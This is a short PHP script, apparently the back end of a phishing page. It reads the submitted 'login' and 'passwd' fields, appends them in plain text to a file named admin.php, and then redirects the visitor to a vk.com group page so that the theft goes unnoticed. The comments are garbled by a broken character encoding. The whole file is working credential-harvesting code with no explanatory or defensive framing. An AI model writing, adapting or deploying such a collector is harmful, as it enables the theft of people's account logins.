<?PHP

$Login = $_POST['login']; // �����
$Pass = $_POST['passwd']; // ������

$log = fopen("admin.php","a+"); //��������� ���� ����
fwrite($log,"<br>");
fwrite($log,"$Login:$Pass"); //���������� ��
fclose($log); //���������
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=http://vk.com/club59403712'></head></html>"; // ���� ������ ������������ ����� ���� ��� �� ���� ������!
?>